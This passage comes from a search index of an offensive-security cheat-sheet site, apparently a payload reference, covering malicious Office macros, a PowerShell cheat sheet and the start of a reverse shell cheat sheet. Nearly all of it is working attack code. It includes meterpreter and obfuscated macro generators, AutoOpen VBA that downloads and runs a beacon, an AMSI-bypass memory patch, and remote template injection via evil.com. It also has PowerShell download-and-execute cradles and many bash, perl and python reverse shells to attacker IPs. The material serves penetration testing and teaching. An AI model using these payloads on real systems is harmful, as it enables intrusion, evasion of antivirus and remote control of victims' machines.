&lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm\n# Drop and execute embedded file\nmacro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs\n# Obfuscate the vba file generated by msfvenom and put result in a new vba file.\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba\n# Obfuscate Empire stager vba file and generate a MS Word document:\nmacro_pack.exe -f empire.vba -o -G myDoc.docm\n# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)\necho \"https://myurl.url/payload.exe\" \"dropped.exe\" |  macro_pack.exe -o -t DROPPER -G \"drop.xlsm\" \n# Execute calc.exe via Dynamic Data Exchange (DDE) attack\necho calc.exe | macro_pack.exe --dde -G calc.xslx\n# Download and execute file via powershell using Dynamic Data Exchange (DDE) attack\nmacro_pack.exe --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl\n# PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).\nmsfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm\n# PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.\nmsfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm\n# PRO: Generate an HTA payload able to run a shellcode via Excel injection\necho meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples\\nicepic.hta\necho meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\\my_shortcut.lnk\n# PRO: XLM Injection\necho \"MPPro\" | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm --run-in-excel\n# PRO: ShellCode Exec - Heap Injection, AlternativeInjection\necho \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc\necho \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc\n# PRO: More shellcodes\necho x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm \u2013keep-alive\necho \"x86.bin\" \"x64.bin\" | macro_pack.exe -t AUTOSHELLCODE -o \u2013autopack -G sc_auto.doc\necho \"http://192.168.5.10:8080/x32calc.bin\" \"http://192.168.5.10:8080/x64calc.bin\" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\\sc_dl.xls\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-badassmacros","title":"DOCM - BadAssMacros","text":"<p>C# based automated Malicous Macro Generator.</p> <ul> <li>https://github.com/Inf0secRabbit/BadAssMacros</li> </ul> <pre><code>BadAssMacros.exe -h\n# Create VBA for classic shellcode injection from raw shellcode\nBadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s classic -c &lt;caesar_shift_value&gt; -o &lt;path_to_output_file&gt;\nBadAssMacros.exe -i .\\Desktop\\payload.bin -w doc -p no -s classic -c 23 -o .\\Desktop\\output.txt\n# Create VBA for indirect shellcode injection from raw shellcode\nBadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s indirect -o &lt;path_to_output_file&gt;\n# List modules inside Doc/Excel file\nBadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -l\n# Purge Doc/Excel file\nBadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -o &lt;path_to_output_file&gt; -m &lt;module_name&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-cactustorch-vba-module","title":"DOCM - CACTUSTORCH VBA Module","text":"<p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p> <ul> <li>https://github.com/mdsecactivebreach/CACTUSTORCH</li> <li>https://github.com/tyranid/DotNetToJScript/</li> <li>CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY</li> <li> <p>CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ</p> </li> <li> <p>Import .cna in Cobalt Strike</p> </li> <li>Generate a new VBA payload from the CACTUSTORCH menu</li> <li>Download DotNetToJscript</li> <li>Compile it <ul> <li>DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li> <li>ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text \"test\"</li> </ul> </li> <li>Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type     <pre><code>DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch\n</code></pre></li> <li>Use the generated code to replace the hardcoded binary in CactusTorch</li> </ul>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-mmg-with-custom-dl-exec","title":"DOCM - MMG with Custom DL + Exec","text":"<ol> <li>Custom Download in first Macro to \"C:\\Users\\Public\\beacon.exe\"</li> <li>Create a custom binary execute using MMG</li> <li>Merge both Macro</li> </ol> <pre><code>git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator\npython MMG.py configs/generic-cmd.json malicious.vba\n{\n\"description\": \"Generic command exec payload\\nEvasion technique set to none\",\n\"template\": \"templates/payloads/generic-cmd-template.vba\",\n\"varcount\": 152,\n\"encodingoffset\": 5,\n\"chunksize\": 180,\n\"encodedvars\":  {},\n\"vars\":     [],\n\"evasion\":  [\"encoder\"],\n\"payload\": \"cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe\"\n}\n</code></pre> <pre><code>Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long\n\nPublic Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean\n    On Error GoTo Failed\n    DownloadFileA = False\n    'As directory must exist, this is a check\n    If CreateObject(\"Scripting.FileSystemObject\").FolderExists(CreateObject(\"Scripting.FileSystemObject\").GetParentFolderName(DownloadPath)) = False Then Exit Function\n    Dim returnValue As Long\n    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)\n    'If return value is 0 and the file exist, then it is considered as downloaded correctly\n    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0)\n    Exit Function\n\nFailed:\nEnd Function\n\nSub AutoOpen()\n    DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\"\nEnd Sub\n\nSub Auto_Open()\n    DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\"\nEnd Sub\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-activex-based-inkpicture-control-painted-event-autorun-macro","title":"DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro","text":"<p>Go to Developer tab on ribbon <code>-&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control</code> </p> <pre><code>Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)\nRun = Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://&lt;host&gt;/file.exe','file.exe');Start-Process 'file.exe'\", vbNormalFocus)\nEnd Sub\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-obfuscation","title":"VBA Obfuscation","text":"<pre><code># https://www.youtube.com/watch?v=L0DlPOLx2k0\n$ git clone https://github.com/bonnetn/vba-obfuscator\n$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-purging","title":"VBA Purging","text":"<p>VBA Stomping: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. </p> <p> VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#officepurge","title":"OfficePurge","text":"<ul> <li>https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</li> </ul> <pre><code>OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros\nOfficePurge.exe -d excel -f .\\payroll.xls -m Module1\nOfficePurge.exe -d publisher -f .\\donuts.pub -m ThisDocument\nOfficePurge.exe -d word -f .\\malicious.doc -l\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#evilclippy","title":"EvilClippy","text":"<p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files.  Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p> <pre><code># OSX/Linux\nmcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs \n# Windows\ncsc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs \nEvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc\nEvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc\nEvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc\n# make macro code unaccessible is to mark the project as locked and unviewable: -u\n# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.\nEvilClippy.exe -r macrofile.doc\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-offensive-security-template","title":"VBA - Offensive Security Template","text":"<ul> <li>Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</li> <li>Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process</li> <li>RunPE - https://github.com/itm4n/VBA-RunPE</li> <li>Spoof Parent - https://github.com/py7hagoras/OfficeMacro64</li> <li>AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</li> <li>amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</li> <li>VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</li> </ul>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-amsi","title":"VBA - AMSI","text":"<p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</p> <p></p> <p> It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p> <p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p> <ul> <li>AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass</li> </ul> <pre><code>Private Declare PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\nPrivate Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr\nPrivate Declare PtrSafe Function VirtualProtect Lib \"kernel32\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long\nPrivate Declare PtrSafe Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" (Destination As Any, Source As Any, ByVal Length As LongPtr)\n\nPrivate Sub Document_Open()\n    Dim AmsiDLL As LongPtr\n    Dim AmsiScanBufferAddr As LongPtr\n    Dim result As Long\n    Dim MyByteArray(6) As Byte\n    Dim ArrayPointer As LongPtr\n\n    MyByteArray(0) = 184 ' 0xB8\n    MyByteArray(1) = 87  ' 0x57\n    MyByteArray(2) = 0   ' 0x00\n    MyByteArray(3) = 7   ' 0x07\n    MyByteArray(4) = 128 ' 0x80\n    MyByteArray(5) = 195 ' 0xC3\n\n    AmsiDLL = LoadLibrary(\"amsi.dll\")\n    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, \"AmsiScanBuffer\")\n    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)\n    ArrayPointer = VarPtr(MyByteArray(0))\n    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6\n\nEnd Sub\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docx-template-injection","title":"DOCX - Template Injection","text":"<p> Does not require \"Enable Macro\"</p>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#remote-template","title":"Remote Template","text":"<ol> <li>A malicious macro is saved in a Word template .dotm file</li> <li>Benign .docx file is created based on one of the default MS Word Document templates</li> <li>Document from step 2 is saved as .docx</li> <li>Document from step 3 is renamed to .zip</li> <li>Document from step 4 gets unzipped</li> <li>.\\word_rels\\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).     <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"&gt;&lt;Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx\" TargetMode=\"External\"/&gt;&lt;/Relationships&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"&gt;&lt;Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\nTarget=\"https://evil.com/malicious.dotm\" TargetMode=\"External\"/&gt;&lt;/Relationships&gt;\n</code></pre></li> <li>File gets zipped back up again and renamed to .docx</li> </ol>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#template-injections-tools","title":"Template Injections Tools","text":"<ul> <li>https://github.com/JohnWoodman/remoteInjector</li> <li>https://github.com/ryhanson/phishery</li> </ul> <pre><code>$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx\n[+] Opening Word document: good.docx\n[+] Setting Word document template to: https://secure.site.local/docs\n[+] Saving injected Word document to: bad.docx\n[*] Injected Word document has been saved!\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docx-dde","title":"DOCX - DDE","text":"<ul> <li>Insert &gt; QuickPart &gt; Field</li> <li>Right Click &gt; Toggle Field Code</li> <li><code>{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" }</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#references","title":"References","text":"<ul> <li>VBA RunPE Part 1 - itm4n</li> <li>VBA RunPE Part 2 - itm4n</li> <li>Office VBA AMSI Parting the veil on malicious macros - Microsoft</li> <li>Bypassing AMSI fro VBA - Outflank</li> <li>Evil Clippy MS Office Maldoc Assistant - Outflank</li> <li>Old schoold evil execl 4.0 macros XLM - Outflank</li> <li>Excel 4 Macro Generator x86/x64 - bytecod3r</li> <li>VBad - Pepitoh</li> <li>Excel 4.0 Macro Function Reference PDF</li> <li>Excel 4.0 Macros so hot right now - SneekyMonkey</li> <li>Macros and more with sharpshooter v2.0 - mdsec</li> <li>Further evasion in the forgotten corners of ms xls - malware.pizza</li> <li>Excel 4.0 macro old but new - fsx30</li> <li>XLS 4.0 macros and covenant - d-sec</li> <li>Inject macro from a remote dotm template - ired.team</li> <li>Phishinh with OLE - ired.team</li> <li>Phishing SLK - ired.teambypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li> <li>PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</li> <li>AMSI in the heap - rmdavy</li> <li>WordAMSIBypass - rmdavy</li> <li>Dechaining macros and evading EDR - Noora Hyv\u00e4rinen</li> <li>Executing macros from docx with remote - RedXORBlueJuly 18, 2018</li> <li>One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</li> <li>Running macros via ActiveX controls - greyhathacker - September 29, 2016</li> <li>Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</li> </ul>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/","title":"Powershell","text":""},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#summary","title":"Summary","text":"<ul> <li>Execution Policy</li> <li>Encoded Commands</li> <li>Download file</li> <li>Load Powershell scripts</li> <li>Load C# assembly reflectively</li> <li>Secure String to Plaintext</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#execution-policy","title":"Execution Policy","text":"<pre><code>powershell -EncodedCommand $encodedCommand\npowershell -ep bypass ./PowerView.ps1\n# Change execution policy\nSet-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted\nSet-ExecutionPolicy Bypass -Scope Process\n</code></pre>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#constrained-mode","title":"Constrained Mode","text":"<pre><code># Check if we are in a constrained mode\n# Values could be: FullLanguage or ConstrainedLanguage\n$ExecutionContext.SessionState.LanguageMode\n## Bypass\npowershell -version 2\n</code></pre>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#encoded-commands","title":"Encoded Commands","text":"<ul> <li>Windows     <pre><code>$command = 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\n</code></pre></li> <li>Linux:  UTF-16LE encoding is required     <pre><code>echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' | iconv -t utf-16le | base64 -w 0\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#download-file","title":"Download file","text":"<pre><code># Any version\n(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerView.ps1\", \"C:\\Windows\\Temp\\PowerView.ps1\")\nwget \"http://10.10.10.10/taskkill.exe\" -OutFile \"C:\\ProgramData\\unifivideo\\taskkill.exe\"\nImport-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output\n# Powershell 4+\nIWR \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\nInvoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#load-powershell-scripts","title":"Load Powershell scripts","text":"<pre><code># Proxy-aware\nIEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')\necho IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -\npowershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex\"\n# Non-proxy aware\n$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText\n</code></pre>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#load-c-assembly-reflectively","title":"Load C# assembly reflectively","text":"<pre><code># Download and run assembly without arguments\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[rev.Program]::Main()\n# Download and run Rubeus, with arguments (make sure to split the args)\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split())\n# Execute a specific method from an assembly (e.g. a DLL)\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')\n$assem = [System.Reflection.Assembly]::Load($data)\n$class = $assem.GetType(\"ClassLibrary1.Class1\")\n$method = $class.GetMethod(\"runner\")\n$method.Invoke(0, $null)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#secure-string-to-plaintext","title":"Secure String to Plaintext","text":"<pre><code>$pass = \"01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\" | convertto-securestring\n$user = \"HTB\\Tom\"\n$cred = New-Object System.management.Automation.PSCredential($user, $pass)\n$cred.GetNetworkCredential() | fl\nUserName       : Tom\nPassword       : 1ts-mag1c!!!\nSecurePassword : System.Security.SecureString\nDomain         : HTB\n</code></pre>"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#references","title":"References","text":"<ul> <li>Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten</li> <li>Basic PowerShell for Pentesters - HackTricks</li> </ul>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/","title":"Reverse Shell Cheat Sheet","text":""},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Reverse Shell<ul> <li>Awk</li> <li>Automatic Reverse Shell Generator</li> <li>Bash TCP</li> <li>Bash UDP</li> <li>C</li> <li>Dart</li> <li>Golang</li> <li>Groovy Alternative 1</li> <li>Groovy</li> <li>Java Alternative 1</li> <li>Java Alternative 2</li> <li>Java</li> <li>Lua</li> <li>Ncat</li> <li>Netcat OpenBsd</li> <li>Netcat BusyBox</li> <li>Netcat Traditional</li> <li>NodeJS</li> <li>OpenSSL</li> <li>Perl</li> <li>PHP</li> <li>Powershell</li> <li>Python</li> <li>Ruby</li> <li>Socat</li> <li>Telnet</li> <li>War</li> </ul> </li> <li>Meterpreter Shell<ul> <li>Windows Staged reverse TCP</li> <li>Windows Stageless reverse TCP</li> <li>Linux Staged reverse TCP</li> <li>Linux Stageless reverse TCP</li> <li>Other platforms</li> </ul> </li> <li>Spawn TTY Shell</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#tools","title":"Tools","text":"<ul> <li>reverse-shell-generator - Hosted Reverse Shell generator (source) </li> <li>revshellgen -  CLI Reverse Shell generator</li> </ul>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#reverse-shell","title":"Reverse Shell","text":""},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#bash-tcp","title":"Bash TCP","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#bash-udp","title":"Bash UDP","text":"<pre><code>Victim:\nsh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1\nListener:\nnc -u -lvp 4242\n</code></pre> <p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#socat","title":"Socat","text":"<p><pre><code>user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242\nuser@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n</code></pre> <pre><code>user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n</code></pre></p> <p>Static socat binary can be found at https://github.com/andrew-d/static-binaries</p>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\nNOTE: Windows only\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#python","title":"Python","text":"<p>Linux only</p> <p>IPv4 <pre><code>export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n</code></pre></p> <p>IPv4 (No Spaces) <pre><code>python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n</code></pre></p> <p>IPv4 (No Spaces, Shortened) <pre><code>python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n</code></pre></p> <p>IPv4 (No Spaces, Shortened Further) <pre><code>python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 